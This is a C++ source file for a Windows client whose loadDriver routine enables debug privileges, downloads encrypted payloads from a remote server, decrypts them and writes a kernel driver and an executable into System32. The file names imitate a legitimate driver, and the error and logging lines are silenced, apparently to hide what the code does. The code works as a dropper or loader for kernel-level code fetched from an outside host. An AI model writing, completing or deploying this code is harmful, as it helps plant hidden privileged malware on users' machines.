#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <openssl/evp.h>
#include "cryptography.h"
#include "request.h"
#include "xorstr.h"
#include "client.h"

namespace fs = std::filesystem;
using json = nlohmann::json;

bool Client::driverExists(const std::wstring& driverPath) {
    return fs::exists(driverPath);
}

void Client::writeDriver(const std::vector<unsigned char>& driverData, const std::wstring& outputPath) {
    std::ofstream outFile(outputPath, std::ios::binary | std::ios::trunc);
    if (!outFile) {
      //  throw std::runtime_error(adsq("Failed to open file for writing: ") + std::string(outputPath.begin(), outputPath.end()));
    }
    outFile.write(reinterpret_cast<const char*>(driverData.data()), driverData.size());
    outFile.close();

    if (!outFile.good()) {
       // std::cerr << adsq("[ERROR] Failed to write driver file") << std::endl;
    }

   // std::cout << adsq("[INFO] Driver successfully written to: ") << std::string(outputPath.begin(), outputPath.end()) << "\n";

    std::ifstream checkFile(outputPath, std::ios::binary);
    if (checkFile) {
        std::vector<unsigned char> fileContent((std::istreambuf_iterator<char>(checkFile)), std::istreambuf_iterator<char>());
        if (fileContent.size() != driverData.size()) {
           // std::cerr << adsq("[WARNING] Driver file size mismatch!\n");
        }
        else {
           // std::cout << adsq("[INFO] Driver file size verified: ") << fileContent.size() << " bytes\n";
        }
    }
    else {
       // std::cerr << adsq("[ERROR] Failed to verify written driver file\n");
    }
}

void Client::loadDriver(const std::string& host, const std::string& port) {
    try {
        HANDLE hToken;
        TOKEN_PRIVILEGES tkp;

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
           // throw std::runtime_error(adsq("Failed to open process token."));
        }

        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
            CloseHandle(hToken);
           // throw std::runtime_error(adsq("Failed to adjust token privileges."));
        }

        // Check and load pdfwKrnI.sys
        std::wstring pdfwKrnIPath = L"C:\\Windows\\System32\\pdfwKrnI.sys";
        if (!driverExists(pdfwKrnIPath)) {
            std::string rawResponseI = sendRequestWithWinsock(host, port, "/get-drv?driver=pdfwKrnI");
            if (!rawResponseI.empty()) {
                json responseJsonI = json::parse(rawResponseI);
                std::string encryptedDataI = responseJsonI["data"];
                std::string decryptedStringI = decrypt(encryptedDataI);
                std::vector<unsigned char> driverDataI = parseByteArray(decryptedStringI);
                writeDriver(driverDataI, pdfwKrnIPath);
            }
        }
        else {
          //  std::cout << adsq("[INFO] pdfwKrnI.sys already exists, skipping download.") << std::endl;
        }

        // Check and load exe
       
        std::wstring pdfwKrnlPath =L"C:\\Windows\\System32\\pdfwKrnl.exe";
        if (!driverExists(pdfwKrnlPath)) {
            std::string rawResponse = sendRequestWithWinsock(host, port, "/get-drv?driver=pdfwKrnl");
            if (!rawResponse.empty()) {
                json responseJson = json::parse(rawResponse);
                std::string encryptedData = responseJson["data"];
                std::string decryptedString = decrypt(encryptedData);
                std::vector<unsigned char> kdmData = parseByteArray(decryptedString);
                writeDriver(kdmData, pdfwKrnlPath);
            }
        }
        else {
            //std::cout << adsq("[INFO] pdfwKrnl.exe already exists, skipping download.") << std::endl;
        }

        tkp.Privileges[0].Attributes = 0;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
        CloseHandle(hToken);
    }
    catch (const std::exception& ex) {
       // std::cerr << adsq("[ERROR] Exception caught: ") << ex.what() << "\n";
    }
}